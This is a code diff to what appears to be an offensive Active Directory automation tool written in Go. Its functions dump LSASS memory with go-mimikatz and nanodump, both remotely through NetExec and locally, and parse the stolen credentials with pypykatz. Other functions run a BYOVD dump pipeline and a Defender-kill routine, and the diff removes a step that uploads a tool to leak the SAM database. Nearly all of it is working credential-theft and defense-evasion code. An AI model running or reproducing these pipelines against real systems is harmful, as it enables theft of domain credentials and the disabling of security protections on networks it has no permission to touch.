@@ -196,6 +196,8 @@ func executeMimikatzPipeline(state *core.ADState, host core.Host, pipeline Pipel
 
 	mcfg := tools.DefaultGoMimikatzConfig()
 
+	ctx := context.Background()
+
 	if pipeline.RemoteExec && domain != "" && pass != "" {
 		fmt.Printf("[*] Remote exec go-mimikatz on %s via NetExec...\n", host.IP)
 		target := tools.NetExecTarget{
@@ -203,7 +205,6 @@ func executeMimikatzPipeline(state *core.ADState, host core.Host, pipeline Pipel
 			Domain: domain, Username: user, Password: pass,
 		}
 		safeCmd := sanitizeMimikatzCommand(mcfg.Command)
-		ctx := context.Background()
 		r, err := tools.NetExec.Run(ctx, target, "-x", []string{fmt.Sprintf("go-mimikatz %s", safeCmd)})
 		if err == nil && r.Success {
 			creds := pipeline.ParseFn(r.Stdout)
@@ -229,8 +230,8 @@ func executeMimikatzPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	}
 
 	fmt.Println("[*] Running go-mimikatz locally...")
-	r := tools.GoMimikatz.Sekurlsa(mcfg)
-	if r.Success {
+	r, err := tools.GoMimikatz.Sekurlsa(ctx, tools.ExecutionRequest{})
+	if err == nil && r.Success {
 		creds := pipeline.ParseFn(r.Stdout)
 		result.Creds = append(result.Creds, creds...)
 		for _, c := range creds {
@@ -266,6 +267,8 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 		Snapshot: false,
 	}
 
+	ctx := context.Background()
+
 	if pipeline.RemoteExec && domain != "" && pass != "" {
 		fmt.Printf("[*] Remote nanodump on %s via NetExec SMB...\n", host.IP)
 		target := tools.NetExecTarget{
@@ -277,7 +280,6 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 		ncfg.Output = remotePath
 
 		cmd := fmt.Sprintf("nanodump --write %s --fork", remotePath)
-		ctx := context.Background()
 		r, err := tools.NetExec.Run(ctx, target, "-x", []string{cmd})
 		if err != nil || !r.Success {
 			fmt.Printf("[!] Remote execution failed: %s\n", r.Stderr)
@@ -301,15 +303,15 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 		if err == nil && getR.Success {
 			localPath := fmt.Sprintf("/tmp/lsass_remote_%d.dmp", time.Now().Unix())
 			fmt.Printf("[*] Parsing dump with pypykatz...\n")
-			parsed, err := tools.Nanodump.ParseDump(localPath)
+			parsed, err := tools.Nanodump.ParseDump(ctx, localPath)
 			if err != nil {
 				pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localPath)
 				if pyr.Success {
 					creds := pipeline.ParseFn(pyr.Stdout)
 					result.Creds = append(result.Creds, creds...)
 				}
-			} else if parsed != "" {
-				creds := pipeline.ParseFn(parsed)
+			} else if parsed.Success {
+				creds := pipeline.ParseFn(parsed.Stdout)
 				result.Creds = append(result.Creds, creds...)
 			}
 		}
@@ -317,11 +319,13 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	}
 
 	fmt.Println("[*] Running nanodump locally...")
-	r := tools.Nanodump.Run(ncfg)
-	if r.Success {
-		parsed, err := tools.Nanodump.ParseDump(ncfg.Output)
-		if err == nil && parsed != "" {
-			creds := pipeline.ParseFn(parsed)
+	r, err := tools.Nanodump.Run(ctx, tools.ExecutionRequest{
+		Evasion: "fork",
+	})
+	if err == nil && r.Success {
+		parsed, err := tools.Nanodump.ParseDump(ctx, ncfg.Output)
+		if err == nil && parsed.Success {
+			creds := pipeline.ParseFn(parsed.Stdout)
 			result.Creds = append(result.Creds, creds...)
 		}
 	}
@@ -402,7 +406,7 @@ func executeBYOVDPipeline(state *core.ADState, host core.Host, pipeline Pipeline
 	}()
 
 	fmt.Println("[*] BYOVD: Dumping LSASS...")
-	dumpCmd := fmt.Sprintf(`C:\Windows\Temp\nanodump.exe --write C:\Windows\Temp\lsass_byovd.dmp --fork`)
+	dumpCmd := `C:\Windows\Temp\nanodump.exe --write C:\Windows\Temp\lsass_byovd.dmp --fork`
 	dump, err := tools.NetExec.Run(ctx, target, "-x", []string{dumpCmd})
 	if err != nil || !dump.Success {
 		fmt.Println("[!] Dump failed")
@@ -457,22 +461,6 @@ func runDefenderKill(state *core.ADState, host core.Host, target tools.NetExecTa
 	killR, _ := tools.UnDefend.ExecRemote(ctx, target, `C:\Windows\Temp\UnDefend.exe`, tools.UnDefendAggressive)
 	_ = killR
 	time.Sleep(2 * time.Second)
-}
-
-func runBlueHammer(state *core.ADState, host core.Host, target tools.NetExecTarget) {
-	if !tools.BlueHammer.Available() {
-		fmt.Println("[!] FunnyApp.exe (BlueHammer) not found locally, skipping SAM leak")
-		return
-	}
-	ctx := context.Background()
-	fmt.Println("[*] Pre-condition: Uploading FunnyApp.exe to target...")
-	upload, err := tools.NetExec.PutFile(ctx, target, "FunnyApp.exe", `C:\Windows\Temp\`)
-	if err != nil || !upload.Success {
-		fmt.Println("[!] Failed to upload FunnyApp.exe, skipping SAM leak")
-		return
-	}
-	fmt.Println("[*] Pre-condition: Executing BlueHammer to leak SAM via Defender RPC...")
-	tools.BlueHammer.ExecRemote(ctx, target, `C:\Windows\Temp\FunnyApp.exe`)
 }
 
 func executeUnDefendPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
